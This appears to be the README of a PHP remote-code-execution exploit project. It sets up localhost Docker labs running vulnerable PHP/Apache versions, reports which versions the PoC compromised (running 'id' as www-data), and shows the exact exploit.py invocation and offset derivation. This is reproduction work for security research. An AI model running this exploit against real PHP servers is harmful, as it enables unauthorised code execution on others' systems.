# Per-version vulnerable PHP labs

These isolated Apache/mod_php targets use official PHP images released before
the fixed versions in the [PHP security advisory](https://www.php.net/archive/2026.php#2026-10-21-5):
8.5.12, 8.4.27, 8.3.36, and 8.2.35. Each target binds only to localhost and
has its own proof-output directory.

Start or stop these version-specific labs from the repository root:

```sh
docker compose -f docker/docker-compose.yml up -d
for version in 8.5.11 8.5.10 8.5.9 8.4.25 8.4.24 8.3.35 8.2.34; do
  docker compose -f "docker/php-${version}/docker-compose.yml" up -d
done

docker compose -f docker/docker-compose.yml down
for version in 8.5.11 8.5.10 8.5.9 8.4.25 8.4.24 8.3.35 8.2.34; do
  docker compose -f "docker/php-${version}/docker-compose.yml" down
done
```

Targets:

| PHP image | Local URL | Container |
| --- | --- | --- |
| `php:8.5.11-apache` | `http://127.0.0.1:18285/index.php` | `php2shell-8511-target` |
| `php:8.5.10-apache` | `http://127.0.0.1:18510/index.php` | `php2shell-8510-target` |
| `php:8.5.9-apache` | `http://127.0.0.1:18509/index.php` | `php2shell-8509-target` |
| `php:8.4.26-apache` | `http://127.0.0.1:8088/index.php` | `php2shell-target` |
| `php:8.4.25-apache` | `http://127.0.0.1:18425/index.php` | `php2shell-8425-target` |
| `php:8.4.24-apache` | `http://127.0.0.1:18424/index.php` | `php2shell-8424-target` |
| `php:8.3.35-apache` | `http://127.0.0.1:18283/index.php` | `php2shell-8335-target` |
| `php:8.2.34-apache` | `http://127.0.0.1:18282/index.php` | `php2shell-8234-target` |

The PHP 8.4.26 target is the original lab; its compose file is
`docker/docker-compose.yml` rather than a version subdirectory.

## PoC results

Tested with the repository's default `bookworm` profile, three retries per
leak stage, the matching `libphp.so` symbol offsets, and the command
`id>/out/p1`:

| PHP image | Result | Evidence |
| --- | --- | --- |
| `php:8.5.11-apache` | **Success** | Stages 1–3 completed; proof was `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. |
| `php:8.5.10-apache` | **Success** | Stages 1–3 completed; proof was `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. |
| `php:8.5.9-apache` | **No proof** | Stages 1–2 completed in two full runs; stage 3 made five attempts per run without creating `/out/p1`; logs report heap corruption. |
| `php:8.4.26-apache` | Success | Existing official-image reproduction in the root README. |
| `php:8.4.25-apache` | **Success** | Stages 1–3 completed; proof was `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. |
| `php:8.4.24-apache` | **Success** | Stages 1–3 completed; proof was `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. |
| `php:8.3.35-apache` | **No proof** | Stages 1–2 completed; stage 3 made five attempts without creating `/out/p1`, with Apache child aborts/segfaults in the log. |
| `php:8.2.34-apache` | **No proof** | Stage 1 heap leak missed on all three attempts; the worker logs reported heap corruption. |

The `bookworm` heap layout was calibrated against PHP 8.4.26. These results
show the behavior of this PoC and configuration; failure to produce a proof
does not establish that a PHP release is unaffected.

For each container, derive its own symbol offsets and run the PoC from the
repository root (example for PHP 8.5.11):

```sh
python3 docker/offsets.py php2shell-8511-target /tmp/php2shell-8511-offsets.env
python3 exploit.py \
  -u http://127.0.0.1:18285/index.php \
  --docker-container php2shell-8511-target \
  --offsets-file /tmp/php2shell-8511-offsets.env \
  --proof-file docker/php-8.5.11/out/p1 \
  --retries 3
```

Use the corresponding container name, port, offsets file, and proof path from
the table above for the other versions.
